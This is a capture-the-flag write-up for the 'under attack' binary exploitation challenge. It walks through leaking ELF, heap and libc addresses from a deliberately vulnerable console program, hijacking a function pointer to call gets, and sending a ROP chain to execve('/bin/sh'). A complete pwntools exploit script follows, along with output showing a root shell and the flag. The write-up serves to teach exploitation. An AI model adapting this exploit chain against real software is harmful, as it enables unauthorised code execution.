---
title: under attack writeup
date: 2025-06-02
description: "[pwn] writeup of the under attack challenge from nops ctf"
tags: ["ctf","pwn"]
---

# Challenge description

Ladybug Command System FULLY OPERATIONAL

(attached challenge binary with libc)

# Solution

program is command console:
```txt
 ./ladybug_app  
Noopsy Defenses CRUSHED! Ladybug Command System FULLY OPERATIONAL!

--- Ladybug Overlord Command Console ---
       Noopsy Land Operations Menu      
----------------------------------------
unleash_swarm <idx> <size>         - Deploy new agent.
corrupt_systems <idx> <hex_data>   - Inject payload into agent.
gather_intel <idx>                 - Retrieve intel from agent.
retreat_agent <idx>                - Recall agent.
seize_airwaves <hex_addr>          - Hijack comms relay.
send_echo_pulse                    - Send pulse via relay.
steal_noopsy_secrets               - Reveal system blueprint fragment.
initiate_city_takeover <hex_addr>  - Execute final takeover payload.
vanish_into_shadows                - Disengage Ladybug Command.
----------------------------------------

Noopsy Land is ours! Your command, Overlord?:
```

after inspecting decompiled binary these are what the functions do:
```
unleash_swarm <idx> <size>         # malloc of size <size> and print its address
corrupt_systems <idx> <hex_data>   # write hex data to addres in heap of agent - can overflow 
gather_intel <idx>                 # read from agent address (even after free) 
retreat_agent <idx>                # free agent address
seize_airwaves <hex_addr>          # sets echo pulse (function pointer) to address
send_echo_pulse                    # executes pulse (or whatever is at address) 
steal_noopsy_secrets               # prints address of unleash_swarm
initiate_city_takeover <hex_addr>  # read from address 
vanish_into_shadows                # exit program
```

there are a lot of vulerabilites in this program: use after free, arbitrary read, arbitrary write, we also just get leak of address from `steal_noopsy_secrets`.

there are also not so many mitigations:
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

first step is to write wrapper of each function to make code simpler:

```python
def unleash_swarm(idx, size):
    io.sendlineafter(b': ', b'unleash_swarm'+f' {idx} {size}'.encode())
    io.recvuntil(b': ')
    agent_address = io.recvline().strip()
    return int(agent_address, 16)

def corrupt_systems(idx, hex_data):
    io.sendlineafter(b': ', b'corrupt_systems'+f' {idx} {hex_data}'.encode())
    response = io.recvline().strip()
    if b'INJECT_OK' not in response:
        raise Exception(f"Failed to inject payload: {response}")

def gather_intel(idx):
    io.sendlineafter(b': ', b'gather_intel'+f' {idx}'.encode())
    io.recvuntil(b'DATA: ')
    intel = io.recvline().strip()
    return intel.decode('utf-8')

def retreat_agent(idx):
    io.sendlineafter(b': ', b'retreat_agent'+f' {idx}'.encode())
    response = io.recvline().strip()
    if b'RECALL_OK' not in response:
        raise Exception(f"Failed to retreat agent: {response}")

def seize_airwaves(hex_addr):
    io.sendlineafter(b': ', b'seize_airwaves ' + hex_addr)
    response = io.recvline().strip()
    if b'ANTENNA_OK' not in response:
        raise Exception(f"Failed to seize airwaves: {response}")

def steal_noopsy_secrets():
    io.sendlineafter(b': ', b'steal_noopsy_secrets')
    io.recvuntil(b'BLUEPRINT_FRAGMENT: ')
    fragment = io.recvline().strip()
    return int(fragment, 16)

def initiate_city_takeover(hex_addr):
    io.sendlineafter(b': ', b'initiate_city_takeover'+f' {hex_addr}'.encode())
    response = io.recvline().strip()

def send_echo_pulse():
    io.sendlineafter(b': ', b'send_echo_pulse')
```

after that we can get all the leaks we need (even more than necessary):
```python
leak = steal_noopsy_secrets()
elf.address = leak - 0x6d0 # calculating elf base addres from leak of function address
log.info(f'ELF base address: {hex(elf.address)}')

agent0 = unleash_swarm(0, 0x20)
log.info(f'Agent 0 address: {hex(agent0)}')
heap_addr = agent0 - 0x16c0 # calculating heap address from agent address - 
log.info(f'Heap address: {hex(heap_addr)}')

leak = unleash_swarm(1, 0x200000)
libc.address = leak + 2113520 # large allocation is handled by mmap(), and it is in constatnt offset from libc base address
log.info(f'Libc base address: {hex(libc.address)}')
```

now we can use libc addres to just execute one_gadet right ? unfortunately all one_gadgets didn't work and rop chaining isn't possible, because we can just 'jump' to one adress and we cant control stack and further execution flow.

but we can create our own buffer overflow by using `gets` function

```python
seize_airwaves(hex(libc.sym['gets'])[2:].encode())
send_echo_pulse()
```

so when we call `send_echo_pulse` it will execute `gets` function with some register values, but after checking that overflow is possible we can now send our ropchain to the program:

```python
rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
rop.execve(binsh, 0, 0)

io.sendline(b'A'*2168  + rop.chain() ) #calculated with cyclic()
io.sendlineafter(b': ', b'vanish_into_shadows') # we overwrote return addres and when program ends with 'vanish_into_shadows' it will return to our ropchain

io.interactive()
```

exploit works and we get shell:

```
# ./expl.py REMOTE
[*] '/nopsctf/under_attack/ladybug_app'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Opening connection to 0.cloud.chals.io on port 33481: Done
[*] '/nopsctf/under_attack/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] ELF base address: 0x401000
[*] Agent 0 address: 0x65e2c0
[*] Heap address: 0x65cc00
[*] Libc base address: 0x7f27f4887000
[*] Loaded 197 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
Ladybug Command disengaging. Noopsy Land remains under our shadow.
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls
flag.txt
ladybug_app
libc.so.6
$ cat flag.txt
N0PS{its_N0pSt0pia's_Pleasure_that_L4dy_bug__is_w3aaker!!!__}
```

whole exploit code:

```python
#!/usr/bin/python3
from pwn import *
PATH = './ladybug_app'
ADDR = '0.cloud.chals.io'
PORT = 33481
elf = context.binary = ELF(PATH)
context.log_level = 'info'
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
libc = ELF('./libc.so.6')
#libc = elf.libc
######################
def unleash_swarm(idx, size):
    io.sendlineafter(b': ', b'unleash_swarm'+f' {idx} {size}'.encode())
    io.recvuntil(b': ')
    agent_address = io.recvline().strip()
    return int(agent_address, 16)
def corrupt_systems(idx, hex_data):
    io.sendlineafter(b': ', b'corrupt_systems'+f' {idx} {hex_data}'.encode())
    response = io.recvline().strip()
    if b'INJECT_OK' not in response:
        raise Exception(f"Failed to inject payload: {response}")
def gather_intel(idx):
    io.sendlineafter(b': ', b'gather_intel'+f' {idx}'.encode())
    io.recvuntil(b'DATA: ')
    intel = io.recvline().strip()
    return intel.decode('utf-8')
def retreat_agent(idx):
    io.sendlineafter(b': ', b'retreat_agent'+f' {idx}'.encode())
    response = io.recvline().strip()
    if b'RECALL_OK' not in response:
        raise Exception(f"Failed to retreat agent: {response}")
def seize_airwaves(hex_addr):
    io.sendlineafter(b': ', b'seize_airwaves ' + hex_addr)
    response = io.recvline().strip()
    if b'ANTENNA_OK' not in response:
        raise Exception(f"Failed to seize airwaves: {response}")
def steal_noopsy_secrets():
    io.sendlineafter(b': ', b'steal_noopsy_secrets')
    io.recvuntil(b'BLUEPRINT_FRAGMENT: ')
    fragment = io.recvline().strip()
    return int(fragment, 16)
def initiate_city_takeover(hex_addr):
    io.sendlineafter(b': ', b'initiate_city_takeover'+f' {hex_addr}'.encode())
    response = io.recvline().strip()
def send_echo_pulse():
    io.sendlineafter(b': ', b'send_echo_pulse')

    
leak = steal_noopsy_secrets()
elf.address = leak - 0x6d0
log.info(f'ELF base address: {hex(elf.address)}')
agent0 = unleash_swarm(0, 0x20)
log.info(f'Agent 0 address: {hex(agent0)}')
heap_addr = agent0 - 0x16c0
log.info(f'Heap address: {hex(heap_addr)}')
leak = unleash_swarm(1, 0x200000) # large allocation to leak libc
libc.address = leak + 2113520
log.info(f'Libc base address: {hex(libc.address)}')
# one gadet not working :C
# one_gadget1 = 0x4c139 + libc.address
# one_gadget2 = 0x4c140 + libc.address
# one_gadget3 = 0xd515f + libc.address
# seize_airwaves(hex(one_gadget3)[2:].encode())
# send_echo_pulse()


seize_airwaves(hex(libc.sym['gets'])[2:].encode())
send_echo_pulse()
rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
rop.execve(binsh, 0, 0)

io.sendline(b'A'*2168  + rop.chain() )
io.sendlineafter(b': ', b'vanish_into_shadows')
io.interactive()
```